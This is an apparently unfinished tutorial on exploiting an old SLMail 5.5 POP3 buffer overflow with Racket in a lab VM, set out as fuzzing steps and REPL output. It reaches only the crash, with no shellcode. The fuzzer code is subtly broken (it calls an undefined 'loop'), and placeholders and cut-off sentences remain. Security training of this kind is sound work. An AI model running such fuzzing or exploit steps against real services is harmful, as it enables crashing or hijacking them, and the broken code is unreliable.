This is an exercise in writing an exploit in Racket to demonstrate its flexibility.
We will approach writing an exploit from scratch using Racket from port scanning to shell.


We will target SLMail 5.5, a version of SLMail (from ~2003) that is vulnerable to a buffer-overflow attack.
There is plenty of public exploits available for SLMail 5.5; here are two links to code archived
in the exploit-database, both of which have been written in C. The exploit database is a reputable source of 
public exploit code for security researchers.

https://www.exploit-db.com/exploits/646/

https://www.exploit-db.com/exploits/638/

Each of these also contain a link to the SLMail 5.5 binary so you can learn install the vulnerable service
to learn the mechanics of the attack by hand.

We will require a couple tools outside of our Racket tool belt, these include
*       Metasploit Framework ; 
        A security auditing framework written in ruby on rails that will 
        generate supplementary code to help both fuzz and return a shell.
        Metasploit can be installed on Windows or popular Linux distros,
        we will use Kali Linux which has Metasploit as well as all of its dependencies.
        
        Windows XP virtual machine;
        We need a machine with a debugger installed. 
        I will use Immunity Debugger which allowes us to create custom python plugins. 
        We will also use an imported plugin for Immunity caled Mona.py
        Windows XP is a security nightmare, but the lack of ASLR will make writing this exploit easier.
        

![high resolution](/High_Res.png?raw=true "high res architecture")


Consider we have used a portscanner (such as RCat) and discovered a mail server sitting on a target machine.
Using some version matching we find out this server is a SLMail server.


The exploit is trigged by passing a buffer of characters too large for the program to handlewhen it is expecting 
a password for the user -- ie the input for the password variable is never checked to be a valid size for the 
container holding it. When this container overflows it will spill over into adjacent memory, and due to the way
the memory has been written onto the stack we will overwrite the EIP register.
This is the whole attack in a nut shell, by being able to direct where we take our next instruction from
we might have a chance to redirect the execution flow to our own code.

Here are the steps we will take to exploit SLMail:
1. Fuzz the service
..* We need to determine exactly how many character's breaks SLMail, this is one of the most important 
        factors in determining an exploits viability but this only leads us to the next question
2. Where -exactly- in our string, do we overwrite the EIP?
..* Once we determine where in our string the EIP is, we can use this to redirect the execution of SLMails code.
this means if we injects code into the surrounding buffer we might be able to carefully write string that overwrites
EIP to direct the next instruction to fall in our buffer of attack code.
3. Are there bad characters we need to avoid?
..* Before 
       

### Using the REPL to fuzz SLMail
First we want to get a handle on the way to communicate with the SLMail server using racket.
We are going to form a closure over the two procedures returned by the tcp-connect procedure.
From Racket documentation

"Two values are returned by tcp-connect: an input port and an output port. Data can be received from the server through the input port and sent to the server through the output port. "https://docs.racket-lang.org/reference/tcp.html
```racket
> (define-values (in out) (tcp-connect "192.168.1.13" 110))
```

We can use the two ports to read and write *lines* of information.
It is important to note the importance of *lines*, otherwise Racket uses spaces as delimiters for reading.
It is also important to note that the buffer we intend to send to our outbound port does not get pushed across
until we flush the buffer with flush-output.
https://docs.racket-lang.org/reference/port-buffers.html
```racket
> (read-line in)
"+OK POP3 server ie8winxp ready <00003.22238468@ie8winxp>\r"
> (displayln "USER test" out)
> (flush-output out)
> (read-line in)
"+OK test welcome here\r"
> (displayln "PASS not_the_password" out)
> (flush-output out)
> (read-line in)
"-ERR unable to lock mailbox\r"
```

With the information from public exploits we know that if we keep shoving buffers of increasing
size to the SLMail program that we will eventually cause it to overflow.
We attach our SLMail instance to the debugger and write a recursive procedure in the REPL to 
fuzz the PASS with buffers of increasing size. With every recursion we want to be able to see the 
size of the buffer as well as the returned output.
```racket
> (define (fuzz n)
        (if (displayln (read-line in))
            (begin
              (displayln "USER test" out)
              (flush-output out)
              (displayln n)
              (displayln (string-append "PASS " (make-string n #\A)) out)
              (flush-output out)
              (displayln (read-line in))
              (sleep 1)
              (loop (+ n 100))) (displayln (string-append "Broke at " n))))
> (fuzz 100)
+OK POP3 server ie8winxp ready <00004.9451406@ie8winxp>

100
+OK test welcome here

-ERR unable to lock mailbox

200
+OK test welcome here

-ERR unable to lock mailbox

```
...
```racket

2400
+OK test welcome here

-ERR unknown command

2500
+OK test welcome here

-ERR unknown command

2600
+OK test welcome here

```

The last successful buffer was 2600 A's appended together before we hang.
Looking at the debugger we see this:
< first debugger result >

We reset the broken SLMail and the debugger, and try again to ensure we have sucess
```racket
> (displayln "User test" out)
> (flush-output out)
> (read-line in)
"+OK test welcome here\r"
> (displayln (string-append "PASS " (make-string 2900 #\A)) out)
> (flush-output out)
```
